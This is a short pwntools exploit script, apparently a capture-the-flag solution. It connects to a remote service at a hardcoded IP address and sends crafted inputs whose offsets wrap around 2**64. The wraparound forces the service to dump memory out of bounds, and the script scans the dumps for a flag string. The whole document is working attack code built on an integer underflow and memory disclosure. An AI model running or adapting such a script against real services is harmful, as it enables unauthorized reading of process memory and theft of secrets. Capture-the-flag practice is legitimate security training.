from pwn import *

#context.log_level = 'debug'

p = remote('110.10.147.105', 12137)

p.recvuntil('to exit\n')

targlen = 0x10000
for i in range(1, 100):
    payload = 'a @{}a{} '.format(2**64 - targlen*i + 1, targlen + 0x100)
    p.sendline(payload)
    p.recvuntil('hex\n')
    p.sendline('1')
    print('memdump #{}'.format(i))
    data = p.recvuntil('to exit\n')
    if 'FLAG{' in data:
        st = data.find('FLAG{')
        print data[st:data.find('}', st)+1]
        break
